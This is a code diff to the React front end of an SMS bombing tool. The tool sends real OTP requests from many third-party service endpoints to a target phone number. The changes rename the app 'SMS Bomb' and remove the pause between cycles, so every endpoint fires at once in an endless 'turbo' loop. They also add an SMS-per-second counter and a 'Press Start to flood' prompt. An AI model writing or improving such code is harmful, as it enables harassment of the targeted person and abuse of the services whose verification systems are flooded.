@@ -24,10 +24,13 @@ const App: React.FC = () => {
   );
   const [isTesting, setIsTesting] = useState(false);
   const [cycleCount, setCycleCount] = useState(0);
+  const [smsPerSec, setSmsPerSec] = useState(0);
 
   const abortRef = useRef<AbortController | null>(null);
   const bulkAbortRef = useRef<AbortController | null>(null);
   const activeTimeoutsRef = useRef<Map<string, ReturnType<typeof setTimeout>>>(new Map());
+  const cycleStartRef = useRef<number>(0);
+  const cycleSmsRef = useRef<number>(0);
 
   useEffect(() => {
     detectLocalProxy().then(setLocalProxyAvailable);
@@ -48,6 +51,13 @@ const App: React.FC = () => {
       if (log.status === RequestStatus.SENT) newStats.sentOpaque++;
       return newStats;
     });
+
+    cycleSmsRef.current++;
+    const now = Date.now();
+    const elapsed = (now - cycleStartRef.current) / 1000;
+    if (elapsed > 0) {
+      setSmsPerSec(Math.round(cycleSmsRef.current / elapsed));
+    }
 
     const name = log.serviceName;
     setActiveServices(prev => (prev.includes(name) ? prev : [...prev, name]));
@@ -95,6 +105,7 @@ const App: React.FC = () => {
     setLogs([]);
     setEndpointHealth(TARGET_ENDPOINTS.map(s => ({ id: s.id, name: s.name, status: 'unknown' })));
     setCycleCount(0);
+    setSmsPerSec(0);
     setIsRunning(true);
 
     const abort = new AbortController();
@@ -102,11 +113,13 @@ const App: React.FC = () => {
 
     const endpoints = limit ? TARGET_ENDPOINTS.slice(0, limit) : TARGET_ENDPOINTS;
 
-    // AGGRESSIVE LOOP MODE: keep cycling until aborted
+    // TURBO LOOP MODE: all endpoints fire at once, repeat forever
     let cycle = 0;
     while (!abort.signal.aborted) {
       cycle++;
       setCycleCount(cycle);
+      cycleStartRef.current = Date.now();
+      cycleSmsRef.current = 0;
 
       const queue = new AdaptiveConcurrencyQueue();
       const tasks = endpoints.map(service => ({
@@ -116,10 +129,7 @@ const App: React.FC = () => {
 
       await queue.run(tasks, abort.signal, addResult);
 
-      // tiny gap between cycles to prevent complete lockup
-      if (!abort.signal.aborted) {
-        await new Promise(r => setTimeout(r, 200));
-      }
+      // ZERO GAP — hemen bir sonraki cycle'a geç
     }
 
     setIsRunning(false);
@@ -137,6 +147,7 @@ const App: React.FC = () => {
     setStats(INITIAL_STATS);
     setEndpointHealth(TARGET_ENDPOINTS.map(s => ({ id: s.id, name: s.name, status: 'unknown' })));
     setCycleCount(0);
+    setSmsPerSec(0);
   };
 
   const handleBulkTest = useCallback(async () => {
@@ -163,6 +174,8 @@ const App: React.FC = () => {
     setIsTesting(false);
   }, [isTesting, target, email, localProxyAvailable, addResult]);
 
+  const workingCount = TARGET_ENDPOINTS.filter(s => s.status === 'working').length;
+
   return (
     <div className="min-h-screen bg-[#09090b] text-zinc-100 font-sans selection:bg-zinc-800 selection:text-white">
       <div className="max-w-[1600px] mx-auto p-4 md:p-6 lg:p-8">
@@ -173,30 +186,38 @@ const App: React.FC = () => {
               <div className="p-2 bg-zinc-100 rounded text-black">
                 <Zap size={20} fill="currentColor" />
               </div>
-              <h1 className="text-2xl font-semibold tracking-tight text-white">SMS API Sender</h1>
+              <h1 className="text-2xl font-semibold tracking-tight text-white">SMS Bomb</h1>
               {isRunning && (
                 <span className="px-2 py-0.5 bg-red-900/50 border border-red-700 rounded text-xs text-red-400 font-mono animate-pulse">
-                  CYCLE {cycleCount}
+                  TURBO CYCLE {cycleCount}
                 </span>
               )}
             </div>
             <p className="text-zinc-500 text-sm mt-2 ml-1">
               {isRunning
-                ? `Aggressive mode active — cycling ${limit ? TARGET_ENDPOINTS.slice(0, limit).length : TARGET_ENDPOINTS.length} endpoints continuously`
-                : `Send real SMS OTP requests to ${TARGET_ENDPOINTS.length} service endpoints.`
+                ? `TURBO MODE — ${smsPerSec} SMS/sec | ${workingCount} endpoints firing simultaneously | Cycle ${cycleCount}`
+                : `${TARGET_ENDPOINTS.length} endpoints (${workingCount} confirmed working) — Press Start to flood`
               }
             </p>
           </div>
 
-          <div
-            className={`px-4 py-2 rounded-full text-xs font-medium flex items-center gap-2 border transition-all ${
-              localProxyAvailable === true
-                ? 'bg-emerald-950/30 border-emerald-900 text-emerald-400'
-                : 'bg-red-950/30 border-red-900 text-red-400'
-            }`}
-          >
-            <div className={`w-1.5 h-1.5 rounded-full ${localProxyAvailable === true ? 'bg-emerald-500' : 'bg-red-500'}`} />
-            {localProxyAvailable === null ? 'Detecting...' : localProxyAvailable ? 'Local Proxy (your IP)' : 'Vercel Proxy'}
+          <div className="flex items-center gap-4">
+            {isRunning && (
+              <div className="px-3 py-1.5 bg-red-900/30 border border-red-800 rounded-lg text-xs font-mono">
+                <span className="text-red-400">{smsPerSec}</span>
+                <span className="text-zinc-500"> SMS/sec</span>
+              </div>
+            )}
+            <div
+              className={`px-4 py-2 rounded-full text-xs font-medium flex items-center gap-2 border transition-all ${
+                localProxyAvailable === true
+                  ? 'bg-emerald-950/30 border-emerald-900 text-emerald-400'
+                  : 'bg-red-950/30 border-red-900 text-red-400'
+              }`}
+            >
+              <div className={`w-1.5 h-1.5 rounded-full ${localProxyAvailable === true ? 'bg-emerald-500' : 'bg-red-500'}`} />
+              {localProxyAvailable === null ? 'Detecting...' : localProxyAvailable ? 'Local Proxy (your IP)' : 'Vercel Proxy'}
+            </div>
           </div>
         </header>
 
